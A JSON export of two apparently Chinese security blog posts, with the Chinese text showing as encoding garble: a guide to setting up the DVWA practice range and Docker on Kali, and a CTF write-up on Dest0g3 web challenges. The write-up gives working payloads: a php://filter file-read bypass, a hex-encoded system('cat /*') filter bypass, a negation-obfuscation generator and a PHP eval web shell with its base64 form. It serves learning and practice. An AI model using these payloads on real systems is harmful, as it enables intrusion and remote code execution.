[{"title":"webåŸºç¡€å’Œé¶åœºæ­å»º","url":"/2022/12/12/webåŸºç¡€å’Œé¶åœºæ­å»º/","content":"\n# Webå®‰å…¨\nWebæ˜¯äº’è”ç½‘çš„æ€»ç§°ï¼Œå…¨ç§°å³World Wide Webï¼Œ ç¼©å†™ä¸ºWWWï¼Œå…¨çƒå¹¿åŸŸç½‘ï¼Œä¹Ÿç§°ä¸ºä¸‡ç»´ç½‘ï¼Œå®ƒæ˜¯ä¸€ç§åŸºäºè¶…æ–‡æœ¬å’ŒHTTPçš„ã€å…¨çƒæ€§çš„ã€åŠ¨æ€äº¤äº’çš„ã€è·¨å¹³å°çš„åˆ†å¸ƒå¼å›¾å½¢ä¿¡æ¯ç³»ç»Ÿã€‚ç®€å•æ¥è¯´ï¼ŒWebæ˜¯ä¸€ç§ä½“ç³»ç»“æ„ï¼Œé€šè¿‡å®ƒå¯ä»¥è®¿é—®éå¸ƒäºå› ç‰¹ç½‘ä¸»æœºä¸Šçš„è¿æ¥æ–‡æ¡£ã€‚\nwebå®‰å…¨ç®€å•æ¥è¯´å°±æ˜¯ç½‘ç«™çš„å®‰å…¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å­¦ä¹ çš„æ˜¯ï¼Œç½‘ç«™ä¸Šå¯èƒ½å‡ºç°å“ªäº›æ¼æ´ï¼ˆå¸¸è§æ¼æ´ç±»å‹å’ŒåŸç†ï¼‰ï¼Œå¦‚ä½•**å¯»æ‰¾**è¿™äº›æ¼æ´ï¼Œå¦‚ä½•**åˆ©ç”¨**è¿™äº›æ¼æ´ã€‚æœ¬æ–‡å¯ä»¥ä½œä¸ºâ€œæ¸—é€ï¼šä»0åˆ°1â€çš„å…ˆå¯¼ç¯‡ç›®ã€‚\n\n# æ¼æ´æŒ–æ˜\n## æ¼æ´å®šä¹‰\nå¯¹äºæ¼æ´çš„å®˜æ–¹å®šä¹‰ï¼šæ¼æ´æ˜¯åœ¨ç¡¬ä»¶ã€è½¯ä»¶ã€åè®®çš„å…·ä½“å®ç°æˆ–ç³»ç»Ÿå®‰å…¨ç­–ç•¥ä¸Šå­˜åœ¨çš„ç¼ºé™·ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è®¿é—®æˆ–ç ´åç³»ç»Ÿã€‚é€šä¿—çš„è®²ï¼Œåªè¦å¯ä»¥ç»™å‚å•†å¸¦æ¥æŸå¤±çš„éƒ½å¯ä»¥è¢«å«åšæ¼æ´ã€‚\n\n{% asset_img æ¼æ´æŒ–æ˜.png æ¼æ´æŒ–æ˜ %}\n\n## æ¼æ´ç±»å‹(OWASP Top 10 2021 and part of Top 10 2017)\n|    |      |\n|:---:|:---|\n|A01 | 2021-å¤±æ•ˆçš„è®¿é—®æ§åˆ¶(Broken Access Control) |\n|A02 | 2021-åŠ å¯†æœºåˆ¶å¤±è´¥(Cryptographic Failures) |\n|A03 | 2021-æ³¨å…¥(Injection) |\n|A04 | 2021-ä¸å®‰å…¨è®¾è®¡(Insecure Design) |\n|A05 | 2021-å®‰å…¨é…ç½®é”™è¯¯(Security Misconfiguration) |\n|A06 | 2021-è‡ªå¸¦ç¼ºé™·å’Œè¿‡æ—¶çš„ç»„ä»¶(Vulnerable and Outdated Components) |\n|A07 | 2021-èº«ä»½è¯†åˆ«å’Œèº«ä»½éªŒè¯é”™è¯¯(Identification and Authentication Failures) |\n|A08 | 2021-è½¯ä»¶å’Œæ•°æ®å®Œæ•´æ€§æ•…éšœ(Software and Data Integrity Failures) |\n|A09 | 2021-å®‰å…¨æ—¥å¿—å’Œç›‘æ§æ•…éšœ(Security Logging and Monitoring Failures) |\n|A10 | 2021-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ (Sever-Side Request Forgery) |\n|A03|2017-æ•æ„Ÿä¿¡æ¯æ³„éœ²(Sensitive Data Exposure)|\n|A07|2017-è·¨ç«™è„šæœ¬æ”»å‡»(XSS)|\n|A08|2017-ä¸å®‰å…¨çš„ååºåˆ—åŒ–|\n|A09|2017-ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶|\n|A10|2017-ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§|\n\nä¸éš¾å‘ç°ï¼Œè®¸å¤šCTFæ¯”èµ›çš„webé¢˜å°±æ˜¯ä»è¿™äº›æ¼æ´ä¸­å‡ºé¢˜ï¼Œå› æ­¤å¿…é¡»å¯¹å¸¸è§çš„æ¼æ´è¿›è¡Œå…·ä½“ç»†è‡´çš„äº†è§£ï¼Œè¿™ä¹Ÿæ˜¯â€œæŒ–æ´â€çš„åŸºç¡€ã€‚\n\n# æ¼æ´é¶åœºä¹‹DVWA\nDVWAæ˜¯OWASPå®˜æ–¹ç¼–å†™çš„PHPç½‘ç«™ï¼ŒåŒ…å«äº†å„ç§ç½‘ç«™å¸¸è§æ¼æ´ï¼Œå¯ä»¥å­¦ä¹ æ”»å‡»åŠä¿®å¤æ–¹å¼ã€‚å…³äºé¶åœºçš„æ­å»ºï¼Œå¯ä»¥ç”¨æºç é…åˆphpStudyå°çš®é¢æ¿å®ç°ï¼ˆå¸‚é¢ä¸Šæœ‰è®¸å¤šç§ç±»çš„é¶åœºï¼Œå¦ä¸€ä¸ªæˆ‘æ­£åœ¨å­¦ä¹ ä½¿ç”¨çš„å°±æ˜¯pikachuï¼‰ï¼Œå…·ä½“æ­¥éª¤å¯å‚è€ƒå¦‚ä¸‹è¿‡ç¨‹ï¼š\n## DVWAçš„å®‰è£…\n>1 ä¸‹è½½å®‰è£… phpStudy å’Œ DVWAæºç \n\nå¯ä»¥æ ¹æ®éœ€è¦ï¼Œä¸‹è½½åˆé€‚ç‰ˆæœ¬çš„phpStudy.\n\nphpStudyä¸‹è½½åœ°å€:[phpStudy](https://www.xp.cn/download.html)\n\næ¥ä¸‹æ¥è·å–DVWAé¶åœºæºä»£ç .\n\nDVWAæºä»£ç ä¸‹è½½åœ°å€1:[DVWAæºç ](https://github.com/digininja/DVWA/archive/master.zip)\n\nDVWAæºä»£ç ä¸‹è½½åœ°å€2:[DVWAæºç ](https://github.com/ethicalhack3r/DVWA/archive/master.zip)\n\n>2 å°†è§£å‹åçš„DVWAæºä»£ç æ”¾ç½®phpStudyçš„å®‰è£…ç›®å½•**WWWæ–‡ä»¶å¤¹**ä¸­(æœ‰æ—¶éœ€è¦ä¿®æ”¹æºä»£ç æ–‡ä»¶å¤¹ådvwa-masterä¸ºDVWA)\n\n>3 è¿›å…¥DVWA/configç›®å½•ï¼Œå°†config.inc.php.distä¸­çš„diståˆ å»\n\n>4 æ‰“å¼€åˆšåˆšé‡å‘½åçš„config.inc.phpæ–‡ä»¶ï¼Œä¿®æ”¹db_userå’Œdb_password  //é»˜è®¤æ”¹ä¸ºroot root\n\n{% asset_img ä¿®æ”¹é…ç½®å®ä¾‹.png ç¤ºä¾‹ %}\n\nDVWAåœ¨åˆ›å»ºçš„æ—¶å€™éœ€è¦åœ¨æœ¬åœ°å®‰è£…åˆ›å»ºä¸€ä¸ªæ•°æ®åº“(database)ï¼Œä¹Ÿå°±æ„å‘³ç€éœ€è¦è¿æ¥åˆ°æœ¬åœ°å·²æœ‰çš„MySQLçš„æ•°æ®åº“çš„è½¯ä»¶ï¼Œç„¶åå†ç”¨è¿™ä¸ªè½¯ä»¶å»åˆ›å»ºä¸€ä¸ªDVWAçš„æ•°æ®åº“ã€‚å› æ­¤ï¼Œå…¶éœ€è¦MySQLè´¦å·å¯†ç æˆæƒã€‚è¿™é‡Œæˆ‘æ²¡æœ‰ä½¿ç”¨phpStudyçš„MySQLï¼Œè€Œæ˜¯ä½¿ç”¨æœ¬åœ°è‡ªå·±å®‰è£…çš„MySQLï¼Œç”¨æˆ·åä¸ºrootï¼Œå¯†ç ä¸º123@hui.\nå¦‚ä¸‹å›¾ç”Ÿæˆä¸€ä¸ªæ•°æ®åº“\n\n{% asset_img database.png databaseç¤ºä¾‹ %}\n\nè€Œå¯¹äºphpStudyä¸­é›†æˆçš„MySQLæœåŠ¡çš„è´¦å·å¯†ç é»˜è®¤ä¸ºrootå’Œrootï¼Œæ•…è‹¥ä½¿ç”¨phpStudyä¸­çš„MySQLï¼Œéœ€è¦å°†ä¿®æ”¹db_userå’Œdb_passwordä¸ºrootå’Œroot.\n\n\n>5 æµè§ˆå™¨è®¿é—®http://localhost/DVWA/setup.php, ç‚¹å‡»æœ€ä¸‹æ–¹çš„Create Database.\n\n>6 æµè§ˆå™¨è®¿é—®http://localhost/DVWA/, è¾“å…¥ç”¨æˆ·åadminï¼Œå¯†ç passwordï¼Œç™»å½•DVWAå³å¯ã€‚\n\n## DVWAçš„ä½¿ç”¨\nåœ¨DVWA Securityä¸­å¯ä»¥æ‰‹åŠ¨è°ƒæ•´é¶æœºæºç çš„å®‰å…¨çº§åˆ«ï¼Œåˆ†åˆ«ä¸º Lowï¼ŒMediumï¼ŒHighï¼ŒImpossibleï¼Œçº§åˆ«è¶Šé«˜ï¼Œå®‰å…¨é˜²æŠ¤è¶Šä¸¥æ ¼ï¼Œæ¸—é€éš¾åº¦è¶Šå¤§ã€‚ä¸€èˆ¬ Low çº§åˆ«åŸºæœ¬æ²¡æœ‰åšé˜²æŠ¤æˆ–è€…åªæ˜¯æœ€ç®€å•çš„é˜²æŠ¤ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å¤Ÿæ¸—é€æˆåŠŸï¼›è€Œ Medium ä¼šä½¿ç”¨åˆ°ä¸€äº›éå¸¸ç²—ç³™çš„é˜²æŠ¤ï¼Œéœ€è¦ä½¿ç”¨è€…æ‡‚å¾—å¦‚ä½•å»ç»•è¿‡é˜²æŠ¤æªæ–½ï¼›High çº§åˆ«çš„é˜²æŠ¤åˆ™ä¼šå¤§å¤§æé«˜é˜²æŠ¤çº§åˆ«ï¼Œä¸€èˆ¬ High çº§åˆ«çš„é˜²æŠ¤éœ€è¦ç»éªŒéå¸¸ä¸°å¯Œæ‰èƒ½æˆåŠŸæ¸—é€ï¼›æœ€å Impossible åŸºæœ¬æ˜¯ä¸å¯èƒ½æ¸—é€æˆåŠŸçš„ï¼Œæ‰€ä»¥ Impossible çš„æºç ä¸€èˆ¬å¯ä»¥è¢«å‚è€ƒä½œä¸ºç”Ÿäº§ç¯å¢ƒ Web é˜²æŠ¤çš„æœ€ä½³æ‰‹æ®µã€‚\n\nDVWA ä¸€å…±åŒ…å«äº†åä¸ªæ”»å‡»æ¨¡å—ï¼Œåˆ†åˆ«æ˜¯ï¼šBrute Forceï¼ˆæš´åŠ›ï¼ˆç ´è§£ï¼‰ï¼‰ã€Command Injectionï¼ˆå‘½ä»¤è¡Œæ³¨å…¥ï¼‰ã€CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ã€- File Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰ã€File Uploadï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰ã€Insecure CAPTCHA ï¼ˆä¸å®‰å…¨çš„éªŒè¯ç ï¼‰ã€SQL Injectionï¼ˆSQLæ³¨å…¥ï¼‰ã€SQL Injectionï¼ˆBlindï¼‰ï¼ˆSQLç›²æ³¨ï¼‰ã€XSSï¼ˆReflectedï¼‰ï¼ˆåå°„å‹è·¨ç«™è„šæœ¬ï¼‰ã€XSSï¼ˆStoredï¼‰ï¼ˆå­˜å‚¨å‹è·¨ç«™è„šæœ¬ï¼‰ã€‚åŒ…å«äº† OWASP TOP10 çš„æ‰€æœ‰æ”»å‡»æ¼æ´çš„ç»ƒä¹ ç¯å¢ƒï¼Œä¸€ç«™å¼è§£å†³æ‰€æœ‰ Web æ¸—é€çš„å­¦ä¹ ç¯å¢ƒã€‚\n\n# DockeråŸºç¡€\nDockerï¼Œå³â€œå®¹å™¨â€ï¼Œä¾¿äºç¯å¢ƒçš„ç§»æ¤ã€å®‰è£…å’Œç®¡ç†ï¼Œå¹¶ä¸”å…·æœ‰å¾ˆé«˜çš„å®‰å…¨æ€§ã€‚å®¹æ˜“æƒ³è±¡ï¼Œå¦‚æœç”¨ä»¥ä¸Šçš„åŠæ³•éƒ¨ç½²DVWAé¶åœºï¼Œå½“é¶åœºè¢«æ”»å‡»æ—¶ï¼Œæœ¬åœ°å°†ä¼šæ˜¯éå¸¸å±é™©çš„ã€‚\n## è®¤è¯†Docker\nDockeræ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„é•œåƒä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„Linuxæˆ–Windowsæ“ä½œç³»ç»Ÿçš„æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚å®¹å™¨æ˜¯**å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£**\n\n## Dockerå®‰è£…å’Œé…ç½®\nè¿™é‡Œåœ¨kali-linux-2022.1æ“ä½œç³»ç»Ÿä¸­è¿›è¡ŒDockerçš„å®‰è£…å’Œé…ç½®ã€‚\n### æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å’Œå†…æ ¸ç‰ˆæœ¬\n\n```\nuname -a  # æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯\nuname -v  # æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬\n```\n\n{% asset_img ç‰ˆæœ¬å†…æ ¸.png ç³»ç»Ÿä¿¡æ¯å’Œå†…æ ¸ç‰ˆæœ¬ %}\n\n### æ›´æ¢aptæº\né»˜è®¤çš„æºåœ¨å›½å¤–ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªæºå»ä¸‹è½½æ—¶è€—æ—¶å°†ä¼šå¾ˆä¹…ï¼Œæ¢æºå¯ä»¥æé«˜æ•ˆç‡ã€‚\n\n```\nsudo vim /etc/apt/sources.list  # aptæºè·¯å¾„: /etc/apt/sources.list\n```\n\næŒ‰`i`è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œä»ä»¥ä¸‹å›½å†…æºä¸­é€‰æ‹©ä¸€ä¸ªå¤åˆ¶è¿›å»ç„¶åæŒ‰`esc`é”®è¾“å…¥`:wq`ä¿å­˜é€€å‡ºã€‚\n\n```\n#ä¸­ç§‘å¤§\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n#é˜¿é‡Œäº‘\n#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#æ¸…åå¤§å­¦\n#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#æµ™å¤§\n#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n#ä¸œè½¯å¤§å­¦\n#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#é‡åº†å¤§å­¦\n#deb http://http.kali.org/kali kali-rolling main non-free contrib\n#deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n```\n\næ„Ÿè°¢CSDNåšä¸»ã€Œå‘å¾®çš„é‚£èˆã€æ•´ç†çš„2022å¹´å…¨æ–°kaliå›½å†…æº [KALIæ›´æ¢å›½å†…æºï¼ˆ2022å¹´å…¨æ–°ï¼‰](https://blog.csdn.net/fingue/article/details/127096363)\n\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ä¸­ç§‘å¤§çš„æº\n\n{% asset_img æ¢æº.png æ¢æº %}\n\nä¹‹åæ›´æ–°aptæºå³å¯ã€‚\n```\nsudo apt-get update\n```\n\n### Dockerå®‰è£…å’ŒéªŒè¯\n```\nsudo apt-get install -y docker docker-compose   # å®‰è£…dockerå’Œdocker-composeï¼Œ-yè¡¨ç¤ºé»˜è®¤å…¨éƒ¨yes\n``` \n\nå¾…å®‰è£…å®Œæˆåï¼Œå¯ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼Œä»¥éªŒè¯dockeræ˜¯å¦å®‰è£…æˆåŠŸã€‚\n```\ndocker --version # æŸ¥çœ‹ç‰ˆæœ¬\ndocker-compose --version # æŸ¥çœ‹ç‰ˆæœ¬\n```\n\n{% asset_img docker.png dockerå®‰è£…éªŒè¯ %}\n\n### å¯åœç®¡ç†\n```\nsudo systemctl start/stop/restart docker # å¯åŠ¨ã€åœæ­¢ã€é‡å¯docker\n```\n\né€šè¿‡ä»¥ä¸Šå‘½ä»¤å³å¯ä»¥å®ç°Dockerçš„å¯åœã€‚\n### é…ç½®åŠ é€Ÿå™¨\nä½¿ç”¨Dockerçš„æ—¶å€™ï¼Œéœ€è¦ç»å¸¸ä»å®˜æ–¹è·å–é•œåƒï¼Œä½†æ˜¯ç”±äºç½‘ç»œåŸå› ï¼Œæ‹‰å–é•œåƒçš„è¿‡ç¨‹éå¸¸è€—æ—¶ï¼Œä¸¥é‡å½±å“Dockerçš„ä½¿ç”¨ã€‚å› æ­¤å¯ä»¥é€šè¿‡é…ç½®åŠ é€Ÿå™¨æ¥è§£å†³ã€‚\n\n```\n# æ·»åŠ ä¸€ä¸ªdaemon.json\nsudo vim /etc/docker/daemon.json\n# å°†ä»¥ä¸‹é•œåƒæ³¨å†Œcopyè¿›daemon.jsonä¸­\n{ \"registry-mirrors\": [\n    \"https://dockerhub.azk8s.cn\",\n    \"https://reg-mirror.qiniu.com\",\n    \"https://1rqfztnd.mirror.aliyuncs.com\"\n  ]\n}\n```\n\nå†™å…¥daemon.jsonæ–‡ä»¶åï¼Œä¸‹é¢ä½¿åŠ é€Ÿå™¨ç”Ÿæ•ˆã€‚\n```\nsudo systemctl daemon-reload  # é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶\nsudo systemctl restart docker # é‡å¯docker\n```\n\n## Dockerå®‰è£…ã€è¿è¡ŒDVWAé¶åœº\n```\nsudo docker search dvwa # æœç´¢DVWA\nsudo docker pull citizenstig/dvwa # æ‹‰å–å®‰è£…æŒ‡å®šdvwa\nsudo docker run --rm --name dvwa -it -p 8888:80 citizenstig/dvwa  # dockerè¿è¡Œdvwa\nnetstat -ntulp | grep 8888  # æŸ¥çœ‹å®¹å™¨æŒ‡å®šç«¯å£æ˜¯å¦è¢«æ‰“å¼€\nè®¿é—® http://localhost:8888 è¿›è¡Œdvwaçš„è®¿é—®\n```\n\n>æ³¨ï¼šå®¹å™¨åœ¨è¿è¡Œæ—¶ä¼šç”Ÿæˆä¸€ä¸ªé•œåƒï¼Œé•œåƒåœ¨ç”Ÿæˆåä¼šå¤„äºå‡ ç§çŠ¶æ€ï¼šè¿è¡Œä¸­å’Œå·²åœæ­¢ï¼Œ`--rm`å‘½ä»¤ä½¿é•œåƒåœ¨åœæ­¢ä¹‹åè‡ªåŠ¨åˆ é™¤ã€‚éœ€è¦ä¿ç•™é•œåƒæ—¶å°±å¯ä»¥ä¸åŠ è¯¥å‚æ•°ï¼›`--name dvwa`ä¸ºé•œåƒèµ·åä¸ºdvwaï¼›`-p`å¯ç†è§£ä¸ºç«¯å£çš„æ˜ å°„ï¼Œå³æŠŠå¤–éƒ¨çš„8888ç«¯å£æ˜ å°„é•œåƒçš„80ç«¯å£ï¼Œé€šè¿‡è®¿é—®å¤–éƒ¨8888ç«¯å£ï¼Œå³å¯è®¿é—®åˆ°80ç«¯å£ã€‚\n\n{% asset_img re.png %}\n\n","tags":["web","æ¸—é€"],"categories":["æ¸—é€ï¼šä»0åˆ°1"]},{"title":"2022Dest0g3 520è¿æ–°èµ› webï¼ˆ1~5é¢˜ï¼‰","url":"/2022/12/06/2022Dest0g3-520è¿æ–°èµ›-webï¼ˆ1-5é¢˜ï¼‰/","content":"\n# phpdest\n\næ”¾å‡ºæºç ï¼š\n```\n<?php\nhighlight_file(__FILE__);\nrequire_once 'flag.php';\nif(isset($_GET['file'])) {\n    require_once($_GET['file']);\n}\n```\n\nè¿™ä¸€æ¬¡æ˜¯å¯¹`require_once()`å‡½æ•°çš„è€ƒæŸ¥ï¼Œå…¶è°ƒç”¨æ—¶phpä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯åˆ™ä¸ä¼šå†æ¬¡åŒ…å«ï¼Œäºæ˜¯æˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œä»è€Œå®ç°å†æ¬¡åŒ…å«æ–‡ä»¶flag.php.\n\nä¸Šä¸€æ¬¡æˆ‘ä»¬å­¦ä¹ åˆ°phpä¼ªåè®®ï¼Œç»“åˆä¸‹é¢è¿™ä¸ªçŸ¥è¯†ç‚¹\n\n```\n/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ï¼Œ/proc/self/root/æ˜¯æŒ‡å‘/çš„ç¬¦å·é“¾æ¥\n```\n\næˆ‘ä»¬å°±å¯ä»¥ç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ï¼Œç›´æ¥æ„é€ payloadï¼š\n\n```\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\nGETä¼ å‚æˆåŠŸ\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220824214540576-494053270.png\" width=500>\nè½¬ç åæˆåŠŸå¾—åˆ°flag.\n`flag = \"Dest0g3{ef8f9913-9d91-4c88-9773-0810a40f8ad8}`\n[èµ„æ–™æŸ¥é˜…ï¼š[require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶](https://www.anquanke.com/post/id/213235)]\n\n***\n\n# EasyPHP\n\nä¾æ—§ç»™å‡ºæºç ï¼š\n\n```\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo \"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\næ˜“çŸ¥éœ€è¦æˆ‘ä»¬POSTæ–¹å¼ä¼ å…¥`ctf`ï¼Œç„¶åæ‹¼æ¥åœ¨`$fl4g`åé¢ï¼Œè€Œè¾“å‡º`$fl4g`åªèƒ½æƒ³åŠæ³•è§¦å‘`set_error_handler()`ã€‚\n\nè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨`æŠŠæ•°ç»„å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥è¿ç®—æ—¶ä¼šæŠ¥é”™`è¿™ä¸€ç‚¹\n\n```\nNotice:Array to string conversion\n//æŠŠæ•°ç»„å½“æˆäº†å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œè¿›è¡Œ .= è¿ç®—æ—¶ï¼Œä¼šè‡ªåŠ¨æ ¹æ®ç¯å¢ƒéœ€è¦è½¬æ¢æ•°æ®ç±»å‹ï¼ˆechoã€printè¾“å‡ºæ•°ç»„æ—¶ä¹Ÿä¼šæŠ¥è¿™æ ·çš„ä¿¡æ¯ï¼‰\n```\n\næŠŠ`ctf`ç”¨POSTä¼ å…¥ï¼Œå³payload`ctf[]=1`\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825174531270-459754094.png\" width=500>\n\næˆåŠŸè·å¾—flag.\n\n***\n\n# SimpleRCE\n\næºç ç»™å‡ºï¼š\n```\n<?php\nhighlight_file(__FILE__);\n$aaa=$_POST['aaa'];\n$black_list=array('^','.','`','>','<','=','\"','preg','&','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\\\','cut','bash','nl','wget','vi','grep');\n$aaa = str_ireplace($black_list,\"hacker\",$aaa);\neval($aaa);\n?>\n```\n\néœ€è¦æˆ‘ä»¬ç»•è¿‡`str_ireplace()å‡½æ•°(ä¸åŒºåˆ†å¤§å°å†™åœ°å¯¹æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ è¿›è¡Œæœç´¢æ›¿æ¢)`ä¸Šä¼ å‘½ä»¤ï¼Œä»è€Œå®ç°RCE.\n\nâ… ã€åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡\nç”±äºè¿‡æ»¤äº†`decode`ï¼Œbase64ç¼–ç ä¸èƒ½ä½¿ç”¨ï¼Œæˆ‘ä»¬æƒ³åˆ°åå…­è¿›åˆ¶è½¬æ¢åç»•è¿‡ã€‚è„šæœ¬å¦‚ä¸‹ï¼š\n\n```\n<?php\n$a= \"system\";\n$b=\"cat *\";//å‘½ä»¤\n\n$p='sysytem:'.bin2hex($a).'<br>command:'.bin2hex($b);\necho $p;\n?> \n\n//sysytem:73797374656d\n//command:636174202a\n```\n\næ„é€ payload:`aaa=hex2bin('73797374656D')(hex2bin('636174202f2a'));//ä¸åŠ ;ä¸è¡Œ`\næˆåŠŸæ‹¿åˆ°flag.\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825191746040-258199898.png\" width=500>\n\nâ…¡ã€æ— å‚RCEç›´æ¥è¿‡\nçœ‹åˆ°çš„ä¸€ç§å¾ˆç‰›çš„åŠæ³•ï¼Œä¸è¿‡è¿˜æ²¡æœ‰å¼„æ¸…åŸç†ã€‚\npayloadï¼š\n\n```\nPOSTï¼š\naaa=show_source(next(apache_request_headers()));\nUser-Agent: /flag\n```\n\nâ…¢ã€å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–ç»•è¿‡æ–¹æ³•ï¼Œå¦‚å–åç»•è¿‡ï¼šå–ååŸºæœ¬ä¸Šç”¨çš„éƒ½æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œä¸ä¼šè§¦å‘åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚è¿™é‡Œä¸å†èµ˜è¿°ï¼Œç»™å‡ºè„šæœ¬ï¼š\n\n```\n<?php\n//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ\n\n/*author yu22x*/\n\nfwrite(STDOUT,'[+]your function: ');\n\n$system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\nfwrite(STDOUT,'[+]your command: ');\n\n$command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\necho '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';\n\n```\n\n[èµ„æ–™æŸ¥é˜…ï¼š[æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“](https://blog.csdn.net/miuzzx/article/details/109143413)]\n\n***\n\n# funny_upload\n\næŸ¥çœ‹é¡µé¢æºä»£ç \n```\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title></title>\n</head>\n<body>\n\n<script language=\"javascript\">\nfunction Checkfiles()\n{\nvar fup = document.getElementById('file');\nvar fileName = fup.value;\nvar ext = fileName.substring(fileName.lastIndexOf('.') + 1);\nif(ext == \"gif\" || ext == \"GIF\" || ext == \"JPEG\" || ext == \"jpeg\" || ext == \"jpg\" || ext == \"JPG\" || ext == \"png\" || ext == \"PNG\")\n{\nreturn true;\n}\nelse\n{\nalert(\"è¿™ä¸ªæ–‡ä»¶ä¸å¥½ï¼Œæˆ‘ä¸å–œæ¬¢\");\nreturn false;\n}\n}\n</script>\n<form method=\"post\" onsubmit=\"return Checkfiles()\" enctype=\"multipart/form-data\" >\n    <input type=\"file\" name=\"file\" id=\"file\">\n    <input  type=\"submit\" name=\"1\">\n</form>\n\n</body>\n</html>\n\n<script>alert('æ–‡ä»¶å†…å®¹ä¹Ÿæ”¹æ”¹å‘—~');</script>\n```\n\nå¯çŸ¥å‰ç«¯å¯¹æ–‡ä»¶è¿›è¡Œäº†ç»•è¿‡ï¼Œä¸”å¯¹æ–‡ä»¶å†…å®¹ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œå°è¯•base64ç¼–ç ç»•è¿‡ï¼š\n\n```\n<?php @eval($_POST[1]); ?>\nbase64ç¼–ç â€”â€”>\nPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n```\n\n<img 